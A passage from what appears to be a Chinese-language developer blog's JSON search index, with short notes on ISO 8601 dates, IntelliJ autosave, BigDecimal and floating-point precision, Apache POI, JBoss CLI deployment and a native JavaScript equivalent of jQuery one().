XXXX-XX-XXTXX:XX:XXZ","url":"/blog/2019/08/14/ISO-8601-%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F-XXXX-XX-XXTXX-XX-XXZ/","content":"<p>之前有看到這個時間格式<br>但一直沒有紀錄<br>最近剛好看到這個時間格式<br>筆記筆記</p>\n<a id=\"more\"></a>\n<p>一開始的時候，我不知道這個時間格式是什麼名稱<code>ISO 8601</code><br>剛好看到 php 官網<a href=\"https://www.php.net/manual/en/class.datetime.php\" target=\"_blank\" rel=\"noopener\">PHP: DateTime - Manual</a><br><code>const string DateTimeInterface::ISO8601 = &quot;Y-m-d\\TH:i:sO&quot;</code><br>所以才找到名稱…</p>\n<p>有爬到這一篇詳細記錄<a href=\"https://segmentfault.com/a/1190000004292140\" target=\"_blank\" rel=\"noopener\">关于“时间”的一次探索 - 前端涨姿势 - SegmentFault 思否</a> </p>\n<p>因為 MySQL 不能使用 ISO 8601 儲存<br>所以在使用 Laravel 能不能搭配 Carbon<br>還需要研究，有空實作在補</p>\n","categories":["程式心法"],"tags":["timezone"]},{"title":"IntelliJ IDEA 關閉自動存檔","url":"/blog/2018/06/03/IntelliJ-IDEA-%E9%97%9C%E9%96%89%E8%87%AA%E5%8B%95%E5%AD%98%E6%AA%94/","content":"<p>最近因為專案要從IntelliJ IDEA看JAVA程式<br>原本用Visual Studio Code追code太累了<br>最後受不了裝了IntelliJ IDEA<br>發現他會自動存檔….<br>當然這個要解決</p>\n<a id=\"more\"></a>\n<p>但在<a href=\"https://www.v2ex.com/t/375728\" target=\"_blank\" rel=\"noopener\">如何完全禁用 IDEA 的自动保存功能 - V2EX</a><br>很多人都不建議關掉<br>大多數很多人都說自動存檔是IntelliJ IDEA特色<br>要還原那直接用git還原…</p>\n<p>不過我那個專案沒有GIT<br>所以還是看情況吧</p>\n<p>參考來源:<br><a href=\"https://blog.csdn.net/wangjun5159/article/details/55223630\" target=\"_blank\" rel=\"noopener\">intellij 关闭自动保存和标志修改文件为星号 - CSDN博客</a><br><a href=\"http://javabruce.blogspot.com/2017/08/intellij-idea.html\" target=\"_blank\" rel=\"noopener\">Blog of Bruce: IntelliJ IDEA 設定</a></p>\n<p><a href=\"https://codeday.me/bug/20170617/27265.html\" target=\"_blank\" rel=\"noopener\">Intellij IDEA Java类不保存时自动编译 - 代码日志</a></p>\n","categories":["編輯器"],"tags":["自動存檔","IDEA","IntelliJ"]},{"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","url":"/blog/2018/11/29/JAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B/","content":"<p>最近因為公司最近要改報表公式<br>因為對BigDicmal不是很熟<br>所以又特別翻了一下<br>這邊簡單說明一下，城市運算很大數字會失準<br>所以必須用別的方法算出正確數字</p>\n<a id=\"more\"></a>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">rs.getBigDecimal(<span class=\"string\">\"num\"</span>).multiply(<span class=\"keyword\">new</span> BigDecimal(Double.valueOf(<span class=\"number\">1.245</span>))).setScale(<span class=\"number\">0</span>, BigDecimal.ROUND_HALF_UP);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://fireball-catcher.blogspot.com/2012/09/bigdecimal.html\" target=\"_blank\" rel=\"noopener\">瓦特希諾生活記錄: BigDecimal 四捨五入</a><br><a href=\"http://www.xwood.net/_site_domain_/_root/5870/5874/t_c257486.html\" target=\"_blank\" rel=\"noopener\">BigDecimal通过setScale设置小数位数发生ArithmeticException - 小木人印象</a></p>\n<p>setScale(0<code>, BigDecimal.ROUND_HALF_UP</code>);<br>後面<code>, BigDecimal.ROUND_HALF_UP</code>一定要帶入<br>否則當四捨五入會跳出Exception</p>\n<blockquote>\n<p>You have two BigDecimal numbers both of which require over a 1000 decimal places. Trying to set the scale to only have 113 decimal places means you will lose precision and therefore you need to round.</p>\n</blockquote>\n<p>You can use the setScale methods that take a RoundingMode to prevent the exception but not the rounding.</p>\n<p><a href=\"https://stackoverflow.com/questions/10734230/rounding-necessary-with-bigdecimal-numbers\" target=\"_blank\" rel=\"noopener\">java - Rounding necessary with BigDecimal numbers - Stack Overflow</a></p>\n<blockquote>\n<p>System.out.println(“12.5的四舍五入值：” + Math.round(12.5));</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/chenssy/p/3366632.html\" target=\"_blank\" rel=\"noopener\">java提高篇(三)—–java的四舍五入 - chenssy - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/chenssy/archive/2012/09/09/2677279.html\" target=\"_blank\" rel=\"noopener\">使用BigDecimal进行精确运算 - chenssy - 博客园</a></li>\n</ul>\n</blockquote>\n<ul>\n<li><a href=\"http://www.codedata.com.tw/java/java-tutorial-the-2nd-class-1-numeric-types-and-string/\" target=\"_blank\" rel=\"noopener\">Java Tutorial 第二堂（1）數值與字串型態 by caterpillar | CodeData</a></li>\n<li><a href=\"https://hk.saowen.com/a/b9a749edc4f667a5fe6260bb56bd5822807cb65d2312b5153f8c9a3171e5cbb1\" target=\"_blank\" rel=\"noopener\">Java BigDecimal詳解，提供了豐富的四捨五入規則 - 掃文資訊</a></li>\n<li><a href=\"http://www.xwood.net/_site_domain_/_root/5870/5874/t_c257486.html\" target=\"_blank\" rel=\"noopener\">BigDecimal通过setScale设置小数位数发生ArithmeticException - 小木人印象</a></li>\n<li><a href=\"https://blog.csdn.net/qq_36497605/article/details/70597318\" target=\"_blank\" rel=\"noopener\">BigDecimal.setScale 处理java小数用法 - 天涯海角的博客 - CSDN博客</a></li>\n<li><a href=\"https://blog.csdn.net/lilie008/article/details/38318485\" target=\"_blank\" rel=\"noopener\">BigDecimal.setScale()方法 - lilie008的专栏 - CSDN博客</a></li>\n</ul>\n<h3 id=\"PHP-也有浮點數算術問題\"><a href=\"#PHP-也有浮點數算術問題\" class=\"headerlink\" title=\"PHP   也有浮點數算術問題\"></a>PHP   也有浮點數算術問題</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">例如：</span><br><span class=\"line\">1.</span><br><span class=\"line\">$a = 0.1;</span><br><span class=\"line\">$b = 0.7;</span><br><span class=\"line\">var_dump(($a + $b) == 0.8);</span><br><span class=\"line\">打印出來的值為 boolean false</span><br><span class=\"line\">這是為啥?PHP手冊對於浮點數有以下警告信息:</span><br><span class=\"line\">Warning</span><br><span class=\"line\">浮點數精度</span><br><span class=\"line\">顯然簡單的十進制分數如同 0.1 或 0.7 不能在不丟失一點點精度的情況下轉換為內部二進制的格式。這就會造成混亂的結果：例如，floor((0.1+0.7)*10) 通常會返回 7 而不是預期中的 8，因為該結果內部的表示其實是類似 7.9999999999…。</span><br><span class=\"line\">這和一個事實有關，那就是不可能精確的用有限位數表達某些十進制分數。例如，十進制的 1/3 變成了 0.3333333. . .。</span><br><span class=\"line\">所以永遠不要相信浮點數結果精確到了最後一位，也永遠不要比較兩個浮點數是否相等。如果確實需要更高的精度，應該使用任意精度數學函數或者 gmp 函數</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://hk.saowen.com/a/1a3866ccb1c370b2fbcba7841ef434c1b80246a5666867cb549023af83b2088e\" target=\"_blank\" rel=\"noopener\">黃聰：php精度計算問題 - 掃文資訊</a><br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"number\">.1</span> + <span class=\"number\">.2</span>;    <span class=\"comment\">//0.3</span></span><br><span class=\"line\">var_dump(<span class=\"number\">.1</span> + <span class=\"number\">.2</span>); <span class=\"comment\">//float(0.30000000000000004441)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//  PHP echo converts 0.30000000000000004441 to a string and shortens it to “0.3”. To achieve the desired floating point result, adjust the precision ini setting: ini_set(“precision”, 17).</span></span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://0.30000000000000004.com/\" target=\"_blank\" rel=\"noopener\">0.30000000000000004.com/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">These functions are only available if PHP was configured with --enable-bcmath . </span><br><span class=\"line\"></span><br><span class=\"line\">bcmath ist not installed automatically with php 7 on linux (ubuntu server)</span><br><span class=\"line\">You have to use: sudo apt-get install php-bcmath</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://php.net/manual/en/bc.installation.php\" target=\"_blank\" rel=\"noopener\">PHP: Installation - Manual</a></p>\n<h2 id=\"倍精轉數字小筆記\"><a href=\"#倍精轉數字小筆記\" class=\"headerlink\" title=\"倍精轉數字小筆記\"></a>倍精轉數字小筆記</h2><h3 id=\"PHP倍精變成數字-字串\"><a href=\"#PHP倍精變成數字-字串\" class=\"headerlink\" title=\"PHP倍精變成數字(字串)\"></a>PHP倍精變成數字(字串)</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">number_format(<span class=\"number\">1.2378147769392E+14</span>,<span class=\"number\">0</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>)</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/4964059/convert-exponential-to-a-whole-number-in-php/4964120#4964120\" target=\"_blank\" rel=\"noopener\">Convert exponential to a whole number in PHP - Stack Overflow</a></p>\n<h3 id=\"PHP-數字字串-with-comma-轉乘數字\"><a href=\"#PHP-數字字串-with-comma-轉乘數字\" class=\"headerlink\" title=\"PHP 數字字串(with comma)轉乘數字\"></a>PHP 數字字串(with comma)轉乘數字</h3><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$number = <span class=\"string\">'1,000'</span>;</span><br><span class=\"line\">$number = (int) filter_var($number, FILTER_SANITIZE_NUMBER_INT);</span><br><span class=\"line\">var_dump($number);</span><br></pre></td></tr></table></figure>\n<p>Or<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$number = <span class=\"string\">'1,000.5669'</span>;</span><br><span class=\"line\">$number = (float) str_replace(<span class=\"string\">','</span>, <span class=\"string\">''</span>, $number);</span><br><span class=\"line\">var_dump($number);</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://stackoverflow.com/questions/25966365/getting-int-value-from-comma-separated-number-php\" target=\"_blank\" rel=\"noopener\">getting int value from comma separated number php - Stack Overflow</a></p>\n<h3 id=\"MySQL-倍精變成數字-字串\"><a href=\"#MySQL-倍精變成數字-字串\" class=\"headerlink\" title=\"MySQL 倍精變成數字(字串)\"></a>MySQL 倍精變成數字(字串)</h3><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"keyword\">REPLACE</span>(<span class=\"keyword\">FORMAT</span>(<span class=\"number\">100000000000000000000000000000000000000</span>, <span class=\"number\">0</span>), <span class=\"string\">','</span>, <span class=\"string\">''</span>)</span><br></pre></td></tr></table></figure>\n<p>MySQL 轉型型態方法<br><a href=\"https://blog.wu-boy.com/2010/12/%E8%B3%87%E6%96%99%E5%BA%AB-%E5%A6%82%E4%BD%95%E8%BD%89%E6%8F%9B-mysql-varchar-type-%E5%88%B0-int-type/\" target=\"_blank\" rel=\"noopener\">[資料庫] 如何轉換 Mysql varchar type 到 int type | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY</a></p>\n<p><a href=\"http://www.programmer-club.com.tw/ShowSameTitleN/general/6768.html\" target=\"_blank\" rel=\"noopener\">使用浮點數最最基本的觀念 / 一般討論區 / 程式設計俱樂部</a><br><a href=\"https://www.zhihu.com/question/65960911\" target=\"_blank\" rel=\"noopener\">為什麼在項目中要儘量避免使用浮點數，不使用浮點數，那該如何計算浮點數？ - 知乎</a><br><a href=\"https://blog.darkthread.net/blog/about-money-distribution/\" target=\"_blank\" rel=\"noopener\">CODE-分贓程式的寫法-黑暗執行緒</a><br>什麼時候要用浮點數、什麼時候要用倍精?<br>我目前來看在算錢，尤其算拆分比(有用到乘除)算到有小數點會影響到<br>盡可能用bigdicmal這種東西</p>\n","categories":["程式心法"],"tags":["java","flat","bigdicmal"]},{"title":"[JAVA]IntelliJ IDEA Cannot find declaration to go to","url":"/blog/2018/06/03/JAVA-IntelliJ-IDEA-Cannot-find-declaration-to-go-to/","content":"<p>最近使用IntelliJ IDEA看程式，目前使用裝進去發現沒有自動移置定義功能<br>Google找一下，發現不能直接開資料夾<br>要用import方式開啟檔案<br><a href=\"http://www.cnblogs.com/toutou/p/IntelliJ_Idea_error1.html\" target=\"_blank\" rel=\"noopener\">IntelliJ IDEA Cannot find declaration to go to - 请叫我头头哥 - 博客园</a><br><a href=\"https://blog.csdn.net/zy_zhengyang/article/details/78581259\" target=\"_blank\" rel=\"noopener\">Intellij IDEA ，按Ctrl+左键，不能进入类或方法的【解决办法】，提示Cannot find declaration to go to - CSDN博客</a></p>\n","categories":["編輯器"],"tags":["Java","IntelliJ IDEA"]},{"title":"JAVA poi操作excel文件","url":"/blog/2018/08/15/JAVA-poi%E6%93%8D%E4%BD%9Cexcel%E6%96%87%E4%BB%B6/","content":"<p>最近做報表用到POI<br>有踩到一個雷，由於真的不是很熟POI<br>所以趕快來記我踩的雷</p>\n<a id=\"more\"></a>\n<p><a href=\"https://blog.csdn.net/caihaijiang/article/details/6381948\" target=\"_blank\" rel=\"noopener\">poi操作excel文件 - CSDN博客</a><br><a href=\"http://www.cnblogs.com/pcheng/p/7485979.html\" target=\"_blank\" rel=\"noopener\">HSSF、XSSF和SXSSF区别以及Excel导出优化 - PC君 - 博客园</a></p>\n<p>可能踩雷，未知<code>java.lang.IllegalArgumentException: Sheet index (-1) is out of range (0..2)</code>問題<br>經查詢是這段問題<br><code>workbook.setSheetName( sheetIndex , userType == 0 ? label : label + xxxxxx);</code><br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//下面是原寫法</span></span><br><span class=\"line\"><span class=\"comment\">//sheet = workbook.getSheet(\"XXXXX\");</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//下面是修改寫法</span></span><br><span class=\"line\">sheet = workbook.getSheetAt(sheetIndex);</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(<span class=\"string\">\"sheetIndex:\"</span> + workbook.getSheetIndex(sheet));</span><br><span class=\"line\"></span><br><span class=\"line\">String sheetName = userType == <span class=\"number\">0</span> ? label : label + xxxxxx;</span><br><span class=\"line\"><span class=\"comment\">// 按不同方案別命名Sheet</span></span><br><span class=\"line\">workbook.setSheetName(sheetIndex, sheetName);</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(<span class=\"string\">\"sheetName:\"</span> + sheetName);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 按不同方案別命名Sheet</span></span><br><span class=\"line\">workbook.setSheetName( sheetIndex , userType == <span class=\"number\">0</span> ? label : label + xxxxxx);</span><br></pre></td></tr></table></figure></p>\n<p>createRow  會覆蓋當下row<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 由於資料過少的話，temple Excel欄位header會印出來，所以目前先用小於五筆資料，新增5列資料去覆蓋</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (arrayList.size() &lt;= <span class=\"number\">5</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; arrayList.size(); i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> idxrow = i + <span class=\"number\">1</span> + arrayList.size();</span><br><span class=\"line\">        XSSFRow row1 = sheet.createRow(idxrow);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 固定內容部分</span></span><br><span class=\"line\">        XSSFCell cell_1 = row1.createCell(<span class=\"number\">0</span>);</span><br><span class=\"line\">        cell_1.setCellType(XSSFCell.CELL_TYPE_STRING);</span><br><span class=\"line\">        cell_1.setCellValue(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">        XSSFCell cell_2 = row1.createCell(<span class=\"number\">1</span>);</span><br><span class=\"line\">        cell_2.setCellType(XSSFCell.CELL_TYPE_STRING);</span><br><span class=\"line\">        cell_2.setCellValue(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">        XSSFCell cell_3 = row1.createCell(<span class=\"number\">2</span>);</span><br><span class=\"line\">        cell_3.setCellType(XSSFCell.CELL_TYPE_STRING);</span><br><span class=\"line\">        cell_3.setCellValue(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 變動欄位</span></span><br><span class=\"line\">        XSSFCell cell_4 = row1.createCell(<span class=\"number\">3</span>);</span><br><span class=\"line\">        cell_4.setCellType(XSSFCell.CELL_TYPE_STRING);</span><br><span class=\"line\">        cell_4.setCellValue(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">        XSSFCell cell_5 = row1.createCell(<span class=\"number\">4</span>);</span><br><span class=\"line\">        cell_5.setCellType(XSSFCell.CELL_TYPE_STRING);</span><br><span class=\"line\">        cell_5.setCellValue(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\">        XSSFCell cell_6 = row1.createCell(<span class=\"number\">5</span>);</span><br><span class=\"line\">        cell_6.setCellType(XSSFCell.CELL_TYPE_STRING);</span><br><span class=\"line\">        cell_6.setCellValue(<span class=\"string\">\"\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://blog.csdn.net/daemon_boy/article/details/1786384\" target=\"_blank\" rel=\"noopener\">POI ，Java 操作 Excel 实现行的插入（insert row） - CSDN博客</a><br><a href=\"http://cai555.iteye.com/blog/202963\" target=\"_blank\" rel=\"noopener\">POI实现插入一行操作，就像office excel插入一行的操作 - cai555 - ITeye博客</a><br><a href=\"https://www.cnblogs.com/kingangWang/archive/2011/08/31/2161319.html\" target=\"_blank\" rel=\"noopener\">NPOI 插入行[转] - kingang - 博客园</a><br><a href=\"http://blog.51cto.com/zangyanan/1837229\" target=\"_blank\" rel=\"noopener\">Java POI(第一讲):POI中HSSF用法大全-进击的程序猿-51CTO博客</a></p>\n<p>好想寫WEB orz…….</p>\n","categories":["Java"],"tags":["java","poi","excel"]},{"title":"JBoss 佈署程式和 cli 操作小記","url":"/blog/2020/09/29/JBoss-%E4%BD%88%E7%BD%B2%E7%A8%8B%E5%BC%8F%E5%92%8C-cli-%E6%93%8D%E4%BD%9C%E5%B0%8F%E8%A8%98/","content":"<p>最近公司佈署 war 檔程式<br>總是常常遇到 OOM(Out of Memory) 狀況<br>這時候有幾個佈署必須要想辦法排除<br>這邊只記錄我排除經驗與猜測</p>\n<a id=\"more\"></a>\n<p>首先，我先講我認知的佈署 war 兩個方法<br>在 <code>$JBOSS_HOME/standalone/deployment</code> 裡面放置 war 檔案就可以佈署<br>另一個方法是用 SE 會用一個方法佈署到 JBoss 裡面<br>但是 <code>$JBOSS_HOME/standalone/deployment</code> 不會看到 war 檔</p>\n<h2 id=\"手動重新佈署\"><a href=\"#手動重新佈署\" class=\"headerlink\" title=\"手動重新佈署\"></a>手動重新佈署</h2><p>假如上的 war 沒有動作</p>\n<p>touch jboss-helloworld.war.dodeploy</p>\n<p>可以這樣做</p>\n<h2 id=\"異常事件重新佈署上到舊程式\"><a href=\"#異常事件重新佈署上到舊程式\" class=\"headerlink\" title=\"異常事件重新佈署上到舊程式\"></a>異常事件重新佈署上到舊程式</h2><p>首先，我專案用的佈署 war 是 Jenkins<br>因為是 SE 關係，所以我沒辦法看到他設定怎麼佈署<br>但有時候佈署程式，需要手動上 war。</p>\n<p>最近發生怪事情，就是有時候遇到 OOM ， restart JBoss 會 failed<br>然後我把 JBoss 的 <code>$JBOSS_HOME/standalone/config/standalone.xml</code><br>裡面 deployment tag 我上失敗 war 清掉<br>舊可以正常打開，但是需要重新上 war 檔</p>\n<p>但最近不知道 SE ，他們 Jenkns 有調整?<br>我 <code>$JBOSS_HOME/standalone/config/standalone.xml</code></p>\n<h3 id=\"異常事件原因\"><a href=\"#異常事件原因\" class=\"headerlink\" title=\"異常事件原因\"></a>異常事件原因</h3><p>最近剛好看到 JBoss-cli 這個功能，他可以遠端(Remote)佈署 war<br>感覺 SE 是用這個方式佈署 war</p>\n<p>首先遠端佈署你的 JBoss Server 就要啟動(port 9990)</p>\n<blockquote>\n<p>難怪之前 stop JBoss Server ，用 Jenkns 佈署會失敗…</p>\n</blockquote>\n<p>在 local 端使用 $JBOSS_HOME/bin/jboss-cli.sh<br>進去會看到類似 cli 指令可以輸入</p>\n<p>connect xx.xx.xx.xx 就可以進去(沒有設定密碼，會看到 cli 介面)</p>\n<p>這時候就可以輸入 deploy xxxx.war(local) 就可以佈署 <del>其實我還沒有機會嘗試</del></p>\n<h2 id=\"這邊疑問\"><a href=\"#這邊疑問\" class=\"headerlink\" title=\"這邊疑問\"></a>這邊疑問</h2><p>$JBOSS_HOME/standalone/config/standalone.xml</p>\n<p>和</p>\n<p>jboss-cli deploy </p>\n<p>佈署會不會衝突? 這邊是我的猜測<br>然後 $JBOSS_HOME/standalone/config/standalone.xml 裡面的 deployment<br>可以看到 cli 佈署出來 war tag</p>\n<p>其實我還沒搞清楚熱佈署是什麼<br>$JBOSS_HOME/standalone/deployment 其實我在懷疑這邊是不是熱佈署?</p>\n<p>為什麼正式環境改用這jboss-cli 佈署呢?</p>\n<h2 id=\"jboss-cli-指令\"><a href=\"#jboss-cli-指令\" class=\"headerlink\" title=\"jboss-cli 指令\"></a>jboss-cli 指令</h2><p><code>deployment-info</code><br>NAME                 RUNTIME-NAME         PERSISTENT ENABLED STATUS<br>jboss-ejb-in-ear.ear jboss-ejb-in-ear.ear false       true    OK<br>singleton_in_war.war singleton_in_war.war true       true    OK</p>\n<p>其中的 PERSISTENT 並沒查到是什麼意思<br>目前猜測是重啟 war 是不是存在<br>因為 deployment 重啟 war 檔案會重新 load 檔案樣子?</p>\n<h3 id=\"嘗試過指令\"><a href=\"#嘗試過指令\" class=\"headerlink\" title=\"嘗試過指令\"></a>嘗試過指令</h3><p>查詢目前啟動 war 狀況</p>\n<p>/deployment=*:read-attribute(name=name)</p>\n<p>這個超像 war XPath 查詢<br>參考: <a href=\"https://stackoverflow.com/questions/21928887/jboss-7-cli-to-query-all-the-deployed-applications\" target=\"_blank\" rel=\"noopener\">command line interface - JBoss 7 CLI to query all the deployed applications - Stack Overflow</a></p>\n<h3 id=\"其他相關指令連結\"><a href=\"#其他相關指令連結\" class=\"headerlink\" title=\"其他相關指令連結\"></a>其他相關指令連結</h3><ul>\n<li><a href=\"https://www.itread01.com/p/566472.html\" target=\"_blank\" rel=\"noopener\">Jboss 四種部署方法以及探討 - IT閱讀</a></li>\n<li><a href=\"https://www.cnblogs.com/yjmyzz/p/4754976.html\" target=\"_blank\" rel=\"noopener\">jboss CLI 命令行接口学习（适用JBOSS EAP 6.2+） - 菩提树下的杨过 - 博客园</a> 詳細</li>\n<li><a href=\"https://blog.csdn.net/t694728793/article/details/99698846\" target=\"_blank\" rel=\"noopener\">Jboss热部署–jboss-cli.sh指令方式_A HUGE FATTY-CSDN博客</a> 詳細</li>\n<li><a href=\"http://wei-meilin.blogspot.com/2012/11/jeap-6-cli.html\" target=\"_blank\" rel=\"noopener\">JEAP 6 - cli 筆記</a></li>\n<li><a href=\"https://luckyboy7527.pixnet.net/blog/post/116777056-%5Bjboss%5D-jboss-deploy-%E8%AE%80%E5%8F%96%E8%B3%87%E6%96%99%E5%A4%BE%E6%96%B9%E5%BC%8F%2C-deploy-exploded-\" target=\"_blank\" rel=\"noopener\">[JBoss] JBoss Deploy 讀取資料夾方式, Deploy exploded archives JBoss EAP 6 @ 瑞先生 :: 痞客邦 ::</a> dodeploy</li>\n<li><a href=\"https://stackoverflow.com/questions/21928887/jboss-7-cli-to-query-all-the-deployed-applications\" target=\"_blank\" rel=\"noopener\">command line interface - JBoss 7 CLI to query all the deployed applications - Stack Overflow</a></li>\n<li><a href=\"https://access.redhat.com/solutions/383573\" target=\"_blank\" rel=\"noopener\">CLI command to check deployment status in JBoss EAP - Red Hat Customer Portal</a></li>\n</ul>\n<h2 id=\"OOM\"><a href=\"#OOM\" class=\"headerlink\" title=\"OOM\"></a>OOM</h2><ul>\n<li><p><a href=\"https://www.cnblogs.com/rjzheng/p/9685622.html\" target=\"_blank\" rel=\"noopener\">【原创】一个线程oom，进程里其他线程还能运行吗？ - 孤独烟 - 博客园</a></p>\n</li>\n<li><p><a href=\"https://www.zhihu.com/question/25532384\" target=\"_blank\" rel=\"noopener\">线程和进程的区别是什么？ - 知乎</a></p>\n<blockquote>\n<p>進程是資源分配的最小單位，線程是CPU調度的最小單位</p>\n</blockquote>\n</li>\n</ul>\n<p>彩蛋</p>\n<ul>\n<li><a href=\"https://page.codespaper.com/2020/from-nextcloud-to-seafile/\" target=\"_blank\" rel=\"noopener\">从 NextCloud 替换为 Seafile | zwPapEr</a></li>\n<li><a href=\"https://github.com/syncthing/syncthing\" target=\"_blank\" rel=\"noopener\">syncthing/syncthing: Open Source Continuous File Synchronization</a></li>\n<li><a href=\"https://shingle.me/post/%E6%8A%9B%E5%BC%83nextcloud%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8cozycloud/\" target=\"_blank\" rel=\"noopener\">抛弃nextcloud,开始搭建使用cozycloud</a><br>這網站有趣，切換出去會跑出 <code>(=・ω・=) 页面崩溃啦 ~ 快回来看看~</code><br>有空來研究怎麼搞出這個XD</li>\n</ul>\n<p>我有時間寫的話，計畫要寫 seafile docker 實作<br><a href=\"https://www.clementine-player.org/zh_TW/\" target=\"_blank\" rel=\"noopener\">Clementine 音樂播放器</a><br><a href=\"https://zhuanlan.zhihu.com/p/140289336\" target=\"_blank\" rel=\"noopener\">树莓派部署 seafile 和 nextcloud 比较 - 知乎</a><br><a href=\"https://github.com/domenukk/seafile-docker-pi\" target=\"_blank\" rel=\"noopener\">domenukk/seafile-docker-pi: A Docker image for Seafile server - Raspberry Pi Edition</a></p>\n<hr>\n<p>2020-10-08 額外找的</p>\n<ul>\n<li><a href=\"https://lala.im/7154.html\" target=\"_blank\" rel=\"noopener\">Sharry：一个非常好用的文件分享程序-荒岛</a></li>\n<li><a href=\"https://lala.im/4737.html\" target=\"_blank\" rel=\"noopener\">ResilioSync：公私兼备的同步盘-荒岛</a></li>\n<li><a href=\"https://lala.im/4731.html\" target=\"_blank\" rel=\"noopener\">使用Syncthing自建私有同步盘-荒岛</a></li>\n<li><a href=\"https://lala.im/4698.html\" target=\"_blank\" rel=\"noopener\">CozyCloud：基于GO语言开发的网盘/同步盘-荒岛</a></li>\n<li><a href=\"https://lala.im/6617.html\" target=\"_blank\" rel=\"noopener\">Dropit：一个简洁的文件上传工具-荒岛</a></li>\n<li><a href=\"https://lala.im/671.html\" target=\"_blank\" rel=\"noopener\">开源的私有云网盘程序Seafile安装教程-荒岛</a></li>\n</ul>\n","categories":["Java"],"tags":["jboss"]},{"title":"JS 原生方法做到 jQuery one 事件","url":"/blog/2019/09/01/JS-%E5%8E%9F%E7%94%9F%E6%96%B9%E6%B3%95%E5%81%9A%E5%88%B0-jQuery-one-%E4%BA%8B%E4%BB%B6/","content":"<p>今天想用 jQuery one 監聽事件<br>想找原生簡單使用方法<br>原本想 Event 直接取消監聽<br>但還是有爬到比較簡單的做法，簡單紀錄一下</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#click'</span>).addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(e.currentTarget.dataset.triggered) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    e.currentTarget.dataset.triggered = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    alert(<span class=\"string\">'clicked'</span>);</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"click\"</span>&gt;</span>Click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>參考來源:<a href=\"https://stackoverflow.com/questions/36312249/js-equivalent-for-jquery-one\" target=\"_blank\" rel=\"noopener\">javascript - JS equivalent for jQuery one() - Stack Overflow</a></p>\n","categories":["JavaScript"],"tags":["javascript"]},{"title":"JSP 一些常看標籤小記(JSTL, EL, ONGL)","url":"/blog/2020/05/10/JSP-%E4%B8%80%E4%BA%9B%E5%B8%B8%E7%9C%8B%E6%A8%99%E7%B1%A4%E5%B0%8F%E8%A8%98-JSTL-EL-ONGL/","content":"<p>最近使用 struts2 <code>&lt;s:property value=&quot;text&quot;&gt;</code><br>但在 JSP 頁面要做 if 判斷<br>我今天抓不到 struts2 test值<br>剛好網路爬文就找到這篇<a href=\"https://blog.csdn.net/qq30211478/article/details/77188991\" target=\"_blank\" rel=\"noopener\">EL、OGNL、JSTL和struts标签的区别_数据库_qq30211478的博客-CSDN博客</a><br>順便整理</p>\n<a id=\"more\"></a>\n<h2 id=\"先解-struts2-我遇到的問題\"><a href=\"#先解-struts2-我遇到的問題\" class=\"headerlink\" title=\"先解 struts2 我遇到的問題\"></a>先解 struts2 